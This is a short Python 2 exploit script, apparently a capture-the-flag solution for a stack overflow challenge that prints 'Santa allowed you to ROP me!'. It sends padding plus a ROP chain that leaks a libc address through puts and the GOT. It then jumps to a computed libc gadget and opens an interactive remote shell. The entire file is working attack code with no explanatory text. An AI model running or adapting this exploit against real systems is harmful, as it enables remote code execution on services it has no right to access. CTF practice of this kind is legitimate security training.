#!/usr/bin/env python2

import sys, socket, telnetlib
from struct import *

def recvuntil(t):
    data = ''
    while not data.endswith(t):
        tmp = s.recv(1)
        if not tmp: break
        data += tmp

    return data

def interactive():
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()

def p32(x): return pack('<I', x)
def u32(x): return unpack('<I', x)[0]
def p64(x): return pack('<Q', x)
def u64(x): return unpack('<Q', x)[0]

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((sys.argv[1], int(sys.argv[2])))

recvuntil('Santa allowed you to ROP me!\n')
p = p64(0x000000000040077b) # pop rdi
p += p64(0x601018) # put got
p += p64(0x400550)
p += p64(0x400676)
s.send('A'*40 + p + '\n')
leak = s.recv(6)
print map(lambda x: hex(ord(x)), leak)
leak = u64(leak + '\x00\x00')
print hex(leak)

print recvuntil('Santa allowed you to ROP me!\n')

p = p64(leak - 0x6fd60 + 0x46428) # pop rdi

s.send('A'*40 + p + '\n')
interactive()
